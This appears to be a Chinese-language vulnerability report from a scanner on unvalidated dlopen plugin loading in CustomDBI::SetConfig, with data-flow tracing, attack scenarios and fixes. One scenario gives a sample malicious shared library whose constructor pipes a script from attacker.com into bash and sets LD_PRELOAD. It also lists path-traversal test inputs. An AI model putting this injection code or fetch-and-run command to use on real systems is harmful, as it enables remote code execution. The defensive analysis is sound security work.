# VULN-CORE-001：CustomDBI.SetConfig dlopen路径未验证致任意库加载

## 漏洞基本信息

| 属性 | 值 |
|------|-----|
| **漏洞 ID** | VULN-CORE-001 |
| **漏洞类型** | Unsafe Dynamic Library Loading（不安全的动态库加载） |
| **CWE 编号** | CWE-114 |
| **严重等级** | Critical（严重） |
| **置信度** | 85% |
| **发现位置** | `csrc/core/BinaryInstrumentation.cpp:260` |
| **函数名称** | `CustomDBI::SetConfig` |
| **代码片段** | `handle_ = dlopen(pluginPath.c_str(), RTLD_LAZY);` |

## 漏洞描述

`CustomDBI::SetConfig()` 函数将用户提供的 `pluginPath` 直接传递给 `dlopen()` 函数，没有任何路径验证、符号链接检查或权限校验。`pluginPath` 来源于 IPC 客户端配置（通过 `ConfigManager.cpp`），攻击者可以通过控制 IPC 客户端发送恶意路径，导致加载任意共享库，实现代码执行或库注入攻击。

## 漏洞触发条件分析

### 触发条件
1. **攻击者需要控制 `pluginPath`**：可通过 IPC 配置注入或环境变量控制
2. **路径必须指向有效的共享库**：攻击者需要准备恶意 `.so` 文件
3. **文件必须可读**：进程需要有读取权限

### 数据流追踪

```
[数据流路径]
┌─────────────────────────────────────────────────────────────────────┐
│ Source 1: IPC 客户端配置                                           │
│                                                                     │
│ ┌──────────────────────────────────────────────────────────────┐   │
│ │ IPC Client (ConfigManager.cpp)                               │   │
│ │   → SanitizerConfig.pluginPath 字段                          │   │
│ │   → 来自配置文件或用户输入                                   │   │
│ └──────────────────────────────────────────────────────────────┘   │
│         ↓                                                           │
│ Source 2: 环境变量                                                  │
│                                                                     │
│ ┌──────────────────────────────────────────────────────────────┐   │
│ │ ProfConfig::GetMsopprofPath()                                │   │
│ │   → GetEnv(MSOPPROF_EXE_PATH_ENV)                            │   │
│ │   → 返回 opprofPath                                          │   │
│ └──────────────────────────────────────────────────────────────┘   │
│         ↓                                                           │
│ ┌──────────────────────────────────────────────────────────────┐   │
│ │ ProfConfig::GetPluginPath()                                  │   │
│ │   → 拼接路径: {opprofPath}/lib64/libprofplugin_xxx.so        │   │
│ └──────────────────────────────────────────────────────────────┘   │
│         ↓                                                           │
│ ┌──────────────────────────────────────────────────────────────┐   │
│ │ DBITaskConfig::Init()                                        │   │
│ │   → pluginPath_ = pluginPath                                 │   │
│ └──────────────────────────────────────────────────────────────┘   │
│         ↓                                                           │
│ ┌──────────────────────────────────────────────────────────────┐   │
│ │ CustomDBI::SetConfig(config)                                 │   │
│ │   → 【无验证】                                               │   │
│ │   → dlopen(pluginPath.c_str(), RTLD_LAZY)                    │   │
│ │   → [SINK] 加载任意共享库                                    │   │
│ └──────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────┘
```

### 关键代码片段

**BinaryInstrumentation.cpp:250-264 (SetConfig 函数)**
```cpp
bool CustomDBI::SetConfig(const Config& config)
{
    config_ = config;
    const string &pluginPath = config.pluginPath;
    if (pluginPath.empty() || config.archName.empty()) {
        DEBUG_LOG("Invalid dbi config, empty plugin path (%s) or empty arch name (%s).",
            pluginPath.c_str(),
            config.archName.c_str());
        return false;
    }
    // 注意：此处没有任何路径验证！
    handle_ = dlopen(pluginPath.c_str(), RTLD_LAZY);
    if (handle_ == nullptr) {
        DEBUG_LOG("Invalid dbi config, dlopen %s failed", pluginPath.c_str());
        return false;
    }
    // ...
}
```

**HijackedFuncOfKernelLaunch.cpp:270-273 (调用链)**
```cpp
std::string pluginPath = ProfConfig::Instance().GetPluginPath(mode);
DBITaskConfig::Instance().Init(BIType::CUSTOMIZE, pluginPath, matchConfig, path, extraArgs);
```

**DBITask.cpp:139 (配置传递)**
```cpp
BinaryInstrumentation::Config config{taskConfig.pluginPath_, GetTargetArchName(funcCtx), tmpLaunchDir, ...};
```

## 潜在攻击场景

### 场景 1: 路径遍历攻击

**攻击步骤**：
1. 攻击者通过 IPC 配置发送 `pluginPath: "/tmp/../../usr/lib/malicious.so"`
2. 或者使用绝对路径 `/tmp/malicious.so`
3. `dlopen()` 直接加载该路径，绕过任何安全限制

**攻击效果**：
- 加载攻击者控制的共享库
- 共享库的构造函数（`__attribute__((constructor))`）会在加载时自动执行
- 无需等待 `MSBitStart` 被调用

### 场景 2: 符号链接攻击

**攻击步骤**：
1. 攻击者创建符号链接：`ln -s /tmp/malicious.so /usr/local/ascend/lib64/libprofplugin_memorychart.so`
2. 或者替换合法插件文件
3. 程序加载"合法路径"但实际执行恶意代码

### 场景 3: 库注入攻击（通过构造函数）

**恶意库代码示例**：
```cpp
// malicious_lib.cpp
#include <cstdio>
#include <cstdlib>
#include <unistd.h>

// 构造函数在 dlopen 时自动执行
__attribute__((constructor))
static void malicious_init() {
    // 执行恶意代码
    system("curl http://attacker.com/exfil.sh | bash");
    
    // 或者修改环境变量影响后续行为
    setenv("LD_PRELOAD", "/tmp/another_malicious.so", 1);
}

// 导出 MSBitStart 符号（可选，避免 dlsym 失败）
extern "C" {
    void MSBitStart(const char* outputPath, uint16_t length) {
        // 可选择执行额外恶意操作或什么都不做
    }
}
```

**编译并测试**：
```bash
gcc -shared -fPIC -o malicious.so malicious_lib.cpp
# 通过 IPC 发送 pluginPath: "/tmp/malicious.so"
# 或设置环境变量 MSOPPROF_EXE_PATH_ENV=/tmp
```

### 场景 4: IPC 配置注入

**攻击条件**：
- 攻击者能够控制 IPC 客户端进程（msOpProf/msSanitizer）
- 或能拦截/修改 IPC 通信内容

**攻击方式**：
- 通过 Domain Socket 发送包含恶意 pluginPath 的配置消息
- 修改 SanitizerConfig 结构体中的 pluginPath 字段

## 影响范围评估

### 直接影响
| 影面 | 影响描述 |
|------|----------|
| **代码执行** | 通过库构造函数在进程上下文执行任意代码 |
| **内存访问** | 共享库可访问进程的所有内存空间 |
| **API Hook** | 可劫持其他库函数，修改程序行为 |
| **数据窃取** | 可读取敏感数据并外传 |

### 风险等级
- **CWE-114**: 进程控制 - 允许从不受信任的位置加载代码
- **CWE-426**: 信任边界违反 - 加载不受信任的组件
- **CWE-94**: 代码注入 - 通过动态库注入实现

### 受影响组件
| 文件 | 角色 |
|------|------|
| `csrc/core/BinaryInstrumentation.cpp` | 漏洞点 - dlopen 调用 |
| `csrc/runtime/HijackedFuncOfKernelLaunch.cpp` | 调用链 - 触发 DBI |
| `csrc/runtime/inject_helpers/ProfConfig.cpp` | 来源 - 环境变量路径 |
| `csrc/runtime/inject_helpers/DBITask.cpp` | 中间 - 配置传递 |
| `csrc/bind/BindSanitizer.cpp` | IPC 入口 - 配置接收 |

## 修复建议

### 建议 1: 路径白名单验证（推荐）

```cpp
// 新增函数：路径白名单验证
bool ValidatePluginPath(const std::string& pluginPath) {
    // 1. 解析真实路径（处理符号链接）
    std::string realPath;
    if (!Realpath(pluginPath, realPath)) {
        WARN_LOG("Cannot resolve plugin path: %s", pluginPath.c_str());
        return false;
    }
    
    // 2. 白名单目录检查
    std::vector<std::string> allowedDirs;
    std::string ascendHomePath;
    if (GetAscendHomePath(ascendHomePath)) {
        allowedDirs.push_back(JoinPath({ascendHomePath, "lib64"}));
    }
    // 可添加其他可信目录
    
    bool inAllowedDir = false;
    for (const auto& dir : allowedDirs) {
        if (realPath.find(dir) == 0) {
            inAllowedDir = true;
            break;
        }
    }
    
    if (!inAllowedDir) {
        WARN_LOG("Plugin path outside allowed directories: %s", realPath.c_str());
        return false;
    }
    
    // 3. 文件所有权检查（可选）
    // ...
    
    return true;
}

bool CustomDBI::SetConfig(const Config& config) {
    config_ = config;
    const string &pluginPath = config.pluginPath;
    
    if (pluginPath.empty() || config.archName.empty()) {
        return false;
    }
    
    // 【新增】路径验证
    if (!ValidatePluginPath(pluginPath)) {
        ERROR_LOG("Plugin path validation failed: %s", pluginPath.c_str());
        return false;
    }
    
    // 使用验证后的路径
    std::string safePath;
    Realpath(pluginPath, safePath);
    handle_ = dlopen(safePath.c_str(), RTLD_LAZY);
    // ...
}
```

### 建议 2: 使用 CheckInputFileValid 函数

项目中已有 `CheckInputFileValid` 函数（在 FileSystem.cpp），可用于验证路径安全性：

```cpp
bool CustomDBI::SetConfig(const Config& config) {
    // ...
    
    // 【新增】使用已有的验证函数
    if (!CheckInputFileValid(pluginPath)) {
        ERROR_LOG("Plugin path is invalid or contains traversal: %s", pluginPath.c_str());
        return false;
    }
    
    handle_ = dlopen(pluginPath.c_str(), RTLD_LAZY);
    // ...
}
```

### 建议 3: 插件签名验证

```cpp
bool VerifyPluginSignature(const std::string& pluginPath) {
    // 使用公钥验证插件签名
    // 拒绝未签名或签名无效的插件
    // ...
}

bool CustomDBI::SetConfig(const Config& config) {
    // ...
    
    if (!VerifyPluginSignature(pluginPath)) {
        ERROR_LOG("Plugin signature verification failed");
        return false;
    }
    
    handle_ = dlopen(pluginPath.c_str(), RTLD_LAZY);
    // ...
}
```

### 建议 4: 环境变量验证

修改 `ProfConfig::GetMsopprofPath()` 增加验证：

```cpp
std::string ProfConfig::GetMsopprofPath() const {
    std::string msoptPath = GetEnv(MSOPPROF_EXE_PATH_ENV);
    if (!msoptPath.empty()) {
        // 【新增】环境变量路径验证
        if (!CheckInputFileValid(msoptPath)) {
            WARN_LOG("Invalid MSOPPROF_EXE_PATH_ENV value");
            return "";
        }
        
        std::string realPath;
        if (!Realpath(msoptPath, realPath)) {
            WARN_LOG("Cannot resolve MSOPPROF path");
            return "";
        }
        
        // 白名单检查
        std::string ascendHomePath;
        if (GetAscendHomePath(ascendHomePath)) {
            if (realPath.find(ascendHomePath) != 0) {
                WARN_LOG("MSOPPROF path outside allowed directory");
                return "";
            }
        }
        return realPath;
    }
    // ...
}
```

### 建议 5: 审计日志

记录所有插件加载操作：

```cpp
bool CustomDBI::SetConfig(const Config& config) {
    // 记录审计日志
    AUDIT_LOG("Plugin load request: path=%s, caller=%s", 
              pluginPath.c_str(), GetCallerInfo().c_str());
    
    // 验证后再次记录
    AUDIT_LOG("Plugin loaded successfully: real_path=%s", safePath.c_str());
    // ...
}
```

## 验证测试建议

### 安全测试用例
| 测试项 | 测试方法 |
|--------|----------|
| 路径遍历 | 发送 `pluginPath="../../../tmp/malicious.so"` |
| 绝对路径 | 发送 `pluginPath="/tmp/malicious.so"` |
| 符号链接 | 创建符号链接指向恶意文件 |
| 环境变量注入 | 设置 `MSOPPROF_EXE_PATH_ENV=/tmp` |
| IPC 配置注入 | 通过 Domain Socket 发送恶意配置 |

---

**报告生成时间**: 2026-04-21  
**分析工具**: MindStudio-Ops-Common 漏洞扫描器